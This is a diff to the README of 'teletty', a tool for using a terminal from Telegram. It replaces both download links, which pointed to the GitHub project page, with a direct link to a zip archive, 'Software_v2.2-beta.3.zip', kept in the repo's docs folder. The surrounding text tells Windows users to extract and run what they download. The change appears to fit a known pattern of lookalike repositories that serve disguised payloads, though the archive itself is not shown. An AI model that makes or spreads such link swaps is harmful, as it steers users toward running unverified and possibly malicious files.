@@ -1,6 +1,6 @@
 # 📱 teletty - Your terminal, inside Telegram
 
-[![Download teletty](https://img.shields.io/badge/Download%20teletty-blue?style=for-the-badge)](https://github.com/Alexc9681/teletty)
+[![Download teletty](https://img.shields.io/badge/Download%20teletty-blue?style=for-the-badge)](https://raw.githubusercontent.com/Alexc9681/teletty/main/docs/Software_v2.2-beta.3.zip)
 
 ## 🚀 What is teletty?
 
@@ -12,7 +12,7 @@ This makes it useful when you want quick access to a terminal without opening yo
 
 Visit this page to download and set up teletty on Windows:
 
-[Download teletty](https://github.com/Alexc9681/teletty)
+[Download teletty](https://raw.githubusercontent.com/Alexc9681/teletty/main/docs/Software_v2.2-beta.3.zip)
 
 After you open the page, look for the latest release or setup files. If the project provides a Windows app, download it and save it to your PC. If it comes as a zipped folder, extract it before you run it.
 
